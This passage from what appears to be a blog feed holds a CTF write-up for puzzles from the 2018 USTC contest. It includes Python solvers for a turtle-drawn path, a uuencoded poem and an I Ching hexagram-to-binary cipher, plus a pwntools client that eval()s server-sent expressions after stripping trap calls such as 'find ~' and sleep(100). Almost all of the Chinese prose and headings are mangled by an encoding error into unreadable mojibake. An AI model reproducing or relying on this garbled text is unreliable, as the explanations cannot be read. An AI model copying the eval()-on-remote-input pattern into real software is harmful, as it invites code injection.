title="ÁßòÁ±çÊÆãÁØá"></a>ÁßòÁ±çÊÆãÁØá</h2><blockquote><pre><code>‰ªéËøôÈ¢òÂ∞±ÂºÄÂßãÊ∂âÂèäÂè§ÊñáÂåñÔºåÁéÑÂ≠¶Áü•ËØÜ‰∫Ü„ÄÇËøôÈ¢ò‰πüÊòØ‰∏Ä‰∏™‰∏§Â∞èÈ¢òÁöÑÈ¢òÁõÆÔºåÁ¨¨‰∏ÄÈ¢òÁªôÂá∫‰∫Ü‰∏ÄÊÆµmalbolgeËØ≠Ë®ÄÁöÑ‰ª£Á†ÅÂú®Êñá‰ª∂‰∏≠„ÄÇ‰∏Ä‰∏™È™öÊìç‰Ωú„ÄÇ„ÄÇÁõ¥Êé•Áî®ÁÅ´ÁãêÊµèËßàÂô®ÊâìÂºÄÊñá‰ª∂ÔºåÁÑ∂ÂêéË∞ÉÊï¥È°µÈù¢Â§ßÂ∞è(%30)ÔºåÂÆΩÂ∫¶ÂæóÂà∞‰ª•‰∏ãÂò≤ËÆΩCTFerÁöÑÂõæÊ°à:</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc052d4be6b1.png" class="lazyload"><br>   ‚Äã<br>flxg{University_Ridiculous}<br>   ‚Äã<br>Á¨¨‰∫åÈ¢òÂæÖÊõ¥Êñ∞„ÄÇ</p></blockquote><h2 id="Áå´Âí™ÈÅ•ÊéßÂô®"><a href="#Áå´Âí™ÈÅ•ÊéßÂô®" class="headerlink" title="Áå´Âí™ÈÅ•ÊéßÂô®"></a>Áå´Âí™ÈÅ•ÊéßÂô®</h2><blockquote><p>‰∏∫‰∫ÜÊä•Â§çÁå´Âí™ÊääËá™Â∑±ÁöÑ‰ª£Á†ÅÊâì‰π±ÔºàËßÅÔºöÁå´Âí™‰∏éÈîÆÁõòÔºâÔºåD ÂêåÂ≠¶ÊääÁå´Âí™ÈÅ•ÊéßÂô®ÁªëÂú®ÂèØ‰ª•‰∏äÔºàUPÔºâ‰∏ãÔºàDOWNÔºâÂ∑¶ÔºàLEFTÔºâÂè≥ÔºàRIGHTÔºâÁßªÂä®ÁöÑ‰∏âËΩ¥Êú∫Ê¢∞ËáÇ‰∏äÔºåÂºÄÂßã‰ΩøÁî®Ê†ëËéìÊ¥æÔºà‰∏ÄÊ¨æÂü∫‰∫é Linux ÁöÑÂçïÁâáÊú∫ËÆ°ÁÆóÊú∫ÔºâÊéßÂà∂‰∏âËΩ¥Êú∫Ê¢∞ËáÇÔºåËøõËÄåÊéßÂà∂Áå´Âí™Âú®ËçâÂú∞‰∏äË∑ëÊù•Ë∑ëÂéª„ÄÇ </p><p>Ê≠§È¢òÁªôÂá∫ÁöÑtxtÊñá‰ª∂‰∏≠Êúâ U(UP),D(DOWN),L(LEFT),R(RIGHT)ÔºåÂç≥‰∏ä‰∏ãÂ∑¶Âè≥ÂíØÔºåÊó¢ÁÑ∂ÊòØËÆ©Áå´Âí™ÊåâËøô‰∏™Ë∑ëÔºåÂæàÁÆÄÂçïÂ∞±ÊòØÁîªÂá∫Ë∑ØÁ∫øÂõæÂòõÔºåÂÜô‰∏Ä‰∏™ÁÆÄÂçïÁöÑpythonËÑöÊú¨ÔºåÂà©Áî®tutleÊµ∑ÈæüÂ∫ìÂÜôÔºågetflagÔºö</p><p>flag{MeowMeow}</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> turtle <span class="token keyword">as</span> T<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'seq.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    strings <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>T<span class="token punctuation">.</span>speed<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">'U'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"D"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">270</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span><span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token string">"R"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>seth<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        T<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><blockquote><p>ËøêË°åÁªìÊûú:</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0561d47cad.png" class="lazyload"></p><h2 id="Â•πÁöÑËØó"><a href="#Â•πÁöÑËØó" class="headerlink" title="Â•πÁöÑËØó"></a>Â•πÁöÑËØó</h2><blockquote><p>È¢òÁõÆÁªô‰∫Ü‰∏Ä‰∏™poem.zipÔºåÂåÖÂê´‰∏Ä‰∏™pythonËß£ÂØÜËÑöÊú¨Âíå‰∏Ä‰∏™ÂåÖÂê´Âä†ÂØÜÂêéËØóÁöÑÊñá‰ª∂„ÄÇÊ†πÊçÆËß£ÂØÜËÑöÊú¨ÂèØ‰ª•Áü•ÈÅìÊòØuuencodeÔºåÂºÄÂßãËøá‰∫éÁõ∏‰ø°Ëøô‰∏™Ëß£ÂØÜËÑöÊú¨ÔºåÊ≤°ÊÉ≥Âà∞Âá∫È¢ò‰∫∫Âú®ËøôÂÑøÂä®ÊâãËÑö</p><pre class=" language-python"><code class="language-python">   <span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>   <span class="token comment" spellcheck="true"># This script helps you decode "her poem"</span>   <span class="token keyword">from</span> codecs <span class="token keyword">import</span> decode   fin <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>   fout <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"poem.out"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> fin<span class="token punctuation">:</span>      data <span class="token operator">=</span> <span class="token string">"begin 666 &lt;data>\n"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" \nend\n"</span>      decode_data <span class="token operator">=</span> decode<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uu"</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decode_data<span class="token punctuation">)</span>      fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>decode_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"ascii"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>   fin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   fout<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>   <strong>ÈáçÁÇπÔºÅÂú®Á∫øËß£ÂØÜÂØÜÊñáÂç≥ÂèØÂæóÂà∞ÁúüÊ≠£ÁöÑflag</strong>ÔºåflagÂàÜÊï£ËóèÂú®ÊØèË°åÁöÑÂ§¥ÈÉ®Ôºå‰ΩÜÊòØflagÂ∞ë‰∫Ü‰∏Ä‰∏™nÈúÄË¶ÅËá™Ë°åÊ∑ªÂä†Âú®ÊúÄÂêéÈù¢Ë°•ÂÖ®‰∏∫‰∏Ä‰∏™ÂçïËØçfun„ÄÇ</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc057e2cd0ed.png" class="lazyload"></p><h2 id="Áå´Âí™ÂÖãÊòü"><a href="#Áå´Âí™ÂÖãÊòü" class="headerlink" title="Áå´Âí™ÂÖãÊòü"></a>Áå´Âí™ÂÖãÊòü</h2><blockquote><p>nc 202.38.95.46 12009 </p><p>ËüíËõáÊòØ‰∏ÄÁßçÈùûÂ∏∏ÂÆπÊòì‰ΩøÁî®ÁöÑÁºñÁ®ãËØ≠Ë®ÄÔºåËÄÉÈ™å‰Ω†ÂÉè‰∏çÂÉèËüíËõáÁöÑÊ†áÂáÜÂ∞±ÊòØÁªô‰Ω†‰∏Ä‰∫õ Python 3 Ë°®ËææÂºè„ÄÇÂ¶ÇÊûú‰Ω†ËÉΩÊ≠£Á°ÆËÆ°ÁÆóÂá∫Êù•Ôºå‰Ω†Â∞±ÈÄöËøá‰∫ÜÈ™åËØÅ„ÄÇ </p><p>ÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØË¶ÅÂú®30ÁßíÂÜÖÂÆåÊàêÊåáÂÆöÊ¨°Êï∞Ë°®ËææÂºèÁöÑËÆ°ÁÆóÔºåÁÑ∂ÂêéÂèØ‰ª•ÂæóÂà∞ÊúçÂä°Âô®ÁªôÂá∫ÁöÑflagÔºå‰ΩÜÊòØÂùëÁàπÁöÑÊòØË°®ËææÂºè‰∏≠Êúâ‰∏Ä‰∫õÁâπÊÆäÂáΩÊï∞ÔºåÁ±ª‰ºº‰∫éÁõÆÂΩïÈÅçÂéÜ find ~,sleep(100),exit()ÔºåÊâÄ‰ª•ËøôÁßç‰∏úË•øÊàëÈááÂèñ‰∫ÜÊõøÊç¢ÁöÑÊñπÊ≥ï„ÄÇ<br>‚Äã<br>Âõ†‰∏∫printÂáΩÊï∞Âú®python3Âíåpython2‰∏≠‰∏çÂêåÔºåËÄåÊàëÈúÄË¶Å‰ΩøÁî®python2‰∏≠ÁöÑpwntoolsÂ∫ìÔºàpython3ÁöÑsocket‰∏çÁü•‰∏∫‰ΩïÊó†Áî®ÔºâÔºåÂêåÊó∂Êã•Êúâpython3ÁöÑprintÂáΩÊï∞ÁâπÊÄßÔºåËøôÊó∂ÂÄôÂ∞±ÈúÄË¶Å:</p><p>from _ _ future _ _ import print_function</p><p>ÂºïÂÖ•python3 printÂáΩÊï∞„ÄÇ</p><p>ÊúÄÁªàËÑöÊú¨Â¶Ç‰∏ã(ËÑöÊú¨ÊØîËæÉÁÆÄÈôãÔºåÂèØËÉΩÈúÄË¶ÅÂ§öË∑ëÂá†Ê¨°ÊâçËÉΩÂá∫flag)Ôºö</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function<span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"202.38.95.46"</span><span class="token punctuation">,</span><span class="token number">12009</span><span class="token punctuation">)</span>getit <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'sleep(100)'</span><span class="token punctuation">,</span><span class="token string">'int(1)'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'exit()'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'find ~'</span><span class="token punctuation">,</span><span class="token string">'echo 1'</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> strings<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"__import__('time')."</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    key <span class="token operator">=</span> eval<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> strings<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>strings<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><blockquote><p>ËÑöÊú¨ËøêË°åÁªìÊûúÂ¶Ç‰∏ãÔºö</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc05b09d0ecf.png" class="lazyload"></p><h2 id="Áå´Âí™ÁîµË∑Ø"><a href="#Áå´Âí™ÁîµË∑Ø" class="headerlink" title="Áå´Âí™ÁîµË∑Ø"></a>Áå´Âí™ÁîµË∑Ø</h2><blockquote><p>ÂΩìÂπ¥Áé©ÁöÑminercraftË¢´ÂÅöÊàê‰∫ÜÈ¢òÁõÆÔºåÂ•ΩÂêßÔºåÁ∫¢Áü≥ÁîµË∑ØÔºåËøôÊòØ‰∏Ä‰∏™Â≠òÊ°£ÔºåÈúÄË¶ÅÊàë‰ª¨ÊåâËßÑÂæãËæìÂÖ•‰ø°Âè∑ÔºåÁÑ∂ÂêéÁõ¥Âà∞ÂÖâÊü±‰∫ÆËµ∑ÔºåÊ≠£Á°ÆÁöÑ‰ø°Âè∑Âç≥‰∏∫flag:</p><p>flag{0110101000111100101111111111111111111010} </p></blockquote><h2 id="FLXG-ÁöÑÁßòÂØÜ"><a href="#FLXG-ÁöÑÁßòÂØÜ" class="headerlink" title="FLXG ÁöÑÁßòÂØÜ"></a>FLXG ÁöÑÁßòÂØÜ</h2><blockquote><p>È¢òÁõÆÊúâÁÇπÈïøÔºåÊàëÊÄªÁªì‰∏Ä‰∏ãÔºåÁªôÂá∫ÁöÑÊñá‰ª∂‰∏≠ÊòØ‰ºèÁæ≤ÂÖ≠ÂçÅÂõõÂç¶ÁöÑÂç¶Ë±°ÔºåÁÆÄÂçïÊêúÁ¥¢‰∏Ä‰∏ãÂèØ‰ª•Áü•ÈÅìÔºå‰ºèÁæ≤ÂÖ≠ÂçÅÂõõÂç¶ÂèØ‰ª•Ë∑ü‰∫åËøõÂà∂ÊâØ‰∏äÂÖ≥Á≥ªÔºåÂÖ≠ÂçÅÂõõÂç¶ÂàÜÂà´ÂØπÂ∫î‰∫åËøõÂà∂000000-111111ÔºåÂØπÂ∫îÂÖ≥Á≥ªÂ¶Ç‰∏ã:</p></blockquote><pre class=" language-shell"><code class="language-shell">'Âù§': '000000', 'Ââ•': '000001', 'ÊØî': '000010', 'ËßÇ': '000011', 'Ë±´': '000100', 'Êôã': '000101', 'ËêÉ': '000110', 'Âê¶': '000111', 'Ë∞¶': '001000', 'ËâÆ': '001001', 'Ëπá': '001010', 'Ê∏ê': '001011', 'Â∞èËøá': '001100', 'ÊóÖ': '001101', 'Âí∏': '001110', 'ÈÅÅ': '001111', 'Â∏à': '010000', 'Ëíô': '010001', 'Âùé': '010010', 'Ê∂£': '010011', 'Ëß£': '010100', 'Êú™Êµé': '010101', 'Âõ∞': '010110', 'ËÆº': '010111', 'Âçá': '011000', 'Ëõä': '011001', '‰∫ï': '011010', 'Â∑Ω': '011011', 'ÊÅí': '011100', 'Èºé': '011101', 'Â§ßËøá': '011110', 'Âß§': '011111', 'Â§ç': '100000', 'È¢ê': '100001', 'Â±Ø': '100010', 'Áõä': '100011', 'Èúá': '100100', 'Âô¨Âóë': '100101', 'Èöè': '100110', 'Êó†Â¶Ñ': '100111', 'ÊòéÂ§∑': '101000', 'Ë¥≤': '101001', 'Êó¢Êµé': '101010', 'ÂÆ∂‰∫∫': '101011', '‰∏∞': '101100', 'Á¶ª': '101101', 'Èù©': '101110', 'Âêå‰∫∫': '101111', '‰∏¥': '110000', 'Êçü': '110001', 'ËäÇ': '110010', '‰∏≠Â≠ö': '110011', 'ÂΩíÂ¶π': '110100', 'ÁùΩ': '110101', 'ÂÖë': '110110', 'Â±•': '110111', 'Ê≥∞': '111000', 'Â§ßÁïú': '111001', 'ÈúÄ': '111010', 'Â∞èÁïú': '111011', 'Â§ßÂ£Æ': '111100', 'Â§ßÊúâ': '111101', 'Â§¨': '111110', '‰πæ': '111111'</code></pre><blockquote><p>ÂÜô‰∏Ä‰∏™pythonËÑöÊú¨Â∞ÜÈÇ£‰∏™Êñá‰ª∂‰∏≠ÁöÑÂç¶Ë±°ÂàÜÂà´Ëß£Êàê‰∫åËøõÂà∂ÔºåÂèØ‰ª•ÂèëÁé∞bitÊï∞Ê≠£Â•ΩÊòØ4039032ÔºåÂèØ‰ª•Êï¥Èô§8Ôºà8bit‰∏∫1byteÔºâ„ÄÇÂà∞ËøôÂü∫Êú¨‰∏äÂèØ‰ª•Âà§Êñ≠ÊÄùË∑ØÊ≠£Á°Æ„ÄÇ</p><p>ËÑöÊú¨Â¶Ç‰∏ã:</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> respecial <span class="token operator">=</span> <span class="token triple-quoted-string string">'''‰πæÔπëÂù§ÔπëÂ±ØÔπëËíôÔπëÈúÄÔπëËÆºÔπëÂ∏àÔπëÊØîÔπëÂ∞èÁïúÔπëÂ±•ÔπëÊ≥∞ÔπëÂê¶ÔπëÂêå‰∫∫ÔπëÂ§ßÊúâÔπëË∞¶ÔπëË±´ÔπëÈöèÔπëËõäÔπë‰∏¥ÔπëËßÇÔπëÂô¨ÂóëÔπëË¥≤ÔπëÂâ•ÔπëÂ§çÔπëÊó†Â¶ÑÔπëÂ§ßÁïúÔπëÈ¢êÔπëÂ§ßËøáÔπëÂùéÔπëÁ¶ªÔπëÂí∏ÔπëÊÅíÔπëÈÅÅÔπëÂ§ßÂ£ÆÔπëÊôãÔπëÊòéÂ§∑ÔπëÂÆ∂‰∫∫ÔπëÁùΩÔπëËπáÔπëËß£ÔπëÊçüÔπëÁõäÔπëÂ§¨ÔπëÂß§ÔπëËêÉÔπëÂçáÔπëÂõ∞Ôπë‰∫ïÔπëÈù©ÔπëÈºéÔπëÈúáÔπëËâÆÔπëÊ∏êÔπëÂΩíÂ¶πÔπë‰∏∞ÔπëÊóÖÔπëÂ∑ΩÔπëÂÖëÔπëÊ∂£ÔπëËäÇÔπë‰∏≠Â≠öÔπëÂ∞èËøáÔπëÊó¢ÊµéÔπëÊú™Êµé'''</span><span class="token comment" spellcheck="true">#‰∫åËøõÂà∂È°∫Â∫èÁöÑÂç¶Ë±°</span>guashu <span class="token operator">=</span> <span class="token triple-quoted-string string">'''Âù§„ÄÅÂâ•„ÄÅÊØî„ÄÅËßÇ„ÄÅË±´„ÄÅÊôã„ÄÅËêÉ„ÄÅÂê¶„ÄÅË∞¶„ÄÅËâÆ„ÄÅËπá„ÄÅÊ∏ê„ÄÅÂ∞èËøá„ÄÅÊóÖ„ÄÅÂí∏„ÄÅÈÅÅ„ÄÅÂ∏à„ÄÅËíô„ÄÅÂùé„ÄÅÊ∂£„ÄÅËß£„ÄÅÊú™Êµé„ÄÅÂõ∞„ÄÅËÆº„ÄÅÂçá„ÄÅËõä„ÄÅ‰∫ï„ÄÅÂ∑Ω„ÄÅÊÅí„ÄÅÈºé„ÄÅÂ§ßËøá„ÄÅÂß§„ÄÅÂ§ç„ÄÅÈ¢ê„ÄÅÂ±Ø„ÄÅÁõä„ÄÅÈúá„ÄÅÂô¨Âóë„ÄÅÈöè„ÄÅÊó†Â¶Ñ„ÄÅÊòéÂ§∑„ÄÅË¥≤„ÄÅÊó¢Êµé„ÄÅÂÆ∂‰∫∫„ÄÅ‰∏∞„ÄÅÁ¶ª„ÄÅÈù©„ÄÅÂêå‰∫∫„ÄÅ‰∏¥„ÄÅÊçü„ÄÅËäÇ„ÄÅ‰∏≠Â≠ö„ÄÅÂΩíÂ¶π„ÄÅÁùΩ„ÄÅÂÖë„ÄÅÂ±•„ÄÅÊ≥∞„ÄÅÂ§ßÁïú„ÄÅÈúÄ„ÄÅÂ∞èÁïú„ÄÅÂ§ßÂ£Æ„ÄÅÂ§ßÊúâ„ÄÅÂ§¨„ÄÅ‰πæ'''</span><span class="token keyword">def</span> <span class="token function">Getword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    strings <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    s<span class="token operator">=</span>special<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'Ôπë'</span><span class="token punctuation">)</span>    s2 <span class="token operator">=</span> guashu<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"„ÄÅ"</span><span class="token punctuation">)</span>    diction <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'G://Êï∞ÊçÆ//ctfËµõÈ¢ò//‰∏≠ÁßëÂ§ßctf//flxgÁöÑÁßòÂØÜ.txt'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        strings2 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> strings2<span class="token punctuation">:</span>            strings<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    strings <span class="token operator">=</span> set<span class="token punctuation">(</span>strings<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Âõ†‰∏∫Âç¶Ë±°‰∏≠Â≠òÂú®‰∏Ä‰∏™Â≠óÊàñËÄÖ‰∏§‰∏™Â≠óÁöÑÂç¶Ë±°ÔºåjiebaÂàÜËØçÂ∫ì‰∏çÂáÜÁ°ÆÔºåÂ∞±Áî®/Êù•Âå∫Âà´</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        diction<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>strings2<span class="token punctuation">.</span>count<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        strings2 <span class="token operator">=</span> strings2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">'/'</span><span class="token operator">+</span>i<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    diction<span class="token punctuation">,</span>strings2<span class="token punctuation">,</span>s2 <span class="token operator">=</span> Getword<span class="token punctuation">(</span><span class="token punctuation">)</span>    finalbin <span class="token operator">=</span><span class="token string">''</span>    finaldiclist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    dicts<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> diction<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        n<span class="token operator">+=</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">6</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'bits='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>n<span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    finalstrings <span class="token operator">=</span> strings2<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> finalstrings<span class="token punctuation">:</span>        <span class="token keyword">if</span> a <span class="token keyword">in</span> s2<span class="token punctuation">:</span>            finaldiclist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Âª∫Á´ãÂç¶Ë±°‰∏é‰∫åËøõÂà∂ÁöÑÂÖ≥Á≥ªÂ≠óÂÖ∏</span>    nice <span class="token operator">=</span><span class="token number">0</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s2<span class="token punctuation">:</span>        dicts<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> format<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>        n<span class="token operator">=</span>n<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>dicts<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>finaldiclist<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ÊåâÂ≠óÂÖ∏Ëß£ÂØÜÂÜôÂÖ•Êñá‰ª∂</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> finaldiclist<span class="token punctuation">:</span>        finalbin<span class="token operator">+=</span>dicts<span class="token punctuation">[</span>b<span class="token punctuation">]</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'finalbin.txt'</span><span class="token punctuation">,</span><span class="token string">'w+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ff<span class="token punctuation">:</span>        ff<span class="token punctuation">.</span>write<span class="token punctuation">(</span>finalbin<span class="token punctuation">)</span></code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc07be42ac0e.png" class="lazyload"></p><blockquote><p>Êé•‰∏ãÊù•Âà©Áî®pythonÁöÑlibnumÂ∫ìÔºåÂ∞Ü‰∫åËøõÂà∂ËΩ¨Êç¢‰∏∫Â≠óÁ¨¶‰∏≤ÂæóÂà∞Á¨¨‰∏Ä‰∏™flagÔºö</p></blockquote><p>  <img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc0611d2a07a.png" class="lazyload"></p><blockquote><p>Áî®binwalkÂàÜÊûê‰∏Ä‰∏ãÂÜÖÂÆπÔºåÂèëÁé∞ÈáåÈù¢Êúâ‰∏Ä‰∏™ÂéãÁº©ÂåÖÔºåËøõË°åÊèêÂèñÂæóÂà∞‰ª•‰∏ãÊñá‰ª∂Ôºö‰∏Ä‰∏™flag elfÁ®ãÂ∫è Ôºåpasskey.txtÔºåÁÆÄÂçïÁúã‰∏Ä‰∏ãÔºåÊé•‰∏ãÊù•ÁöÑÁ¨¨‰∫åÈ¢òÂ∫îËØ•ÊòØÈÄÜÂêë‰∫Ü„ÄÇ„ÄÇÂæÖÊõ¥Êñ∞„ÄÇ„ÄÇ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/12/5bc061b548e19.png" class="lazyload"></p></blockquote><p>ÂÖàÂà∞Ëøô „ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
            <tag> ustc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10Êúà16-Codegate2018</title>
      <link href="/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/"/>
      <url>/2018/10/16/Pwn-10%E6%9C%8816-Codegate2018-melong/</url>
      
